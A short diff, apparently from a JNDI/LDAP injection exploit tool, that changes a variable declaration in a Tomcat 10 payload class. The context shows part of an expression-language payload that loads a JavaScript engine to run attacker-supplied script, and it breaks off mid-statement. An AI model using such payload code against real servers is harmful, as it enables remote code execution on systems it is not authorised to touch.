@@ -49,7 +49,7 @@ public class Tomcat10 implements LdapController {
 
         } else {
             System.out.println("Using payload from " + Config.jsPayloadPath);
-            var jsScript = Files.readString(Path.of(Config.jsPayloadPath));
+            String jsScript = Files.readString(Path.of(Config.jsPayloadPath));
             payload = ("{" +
                     "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                     ".newInstance().getEngineByName(\"JavaScript\")" +
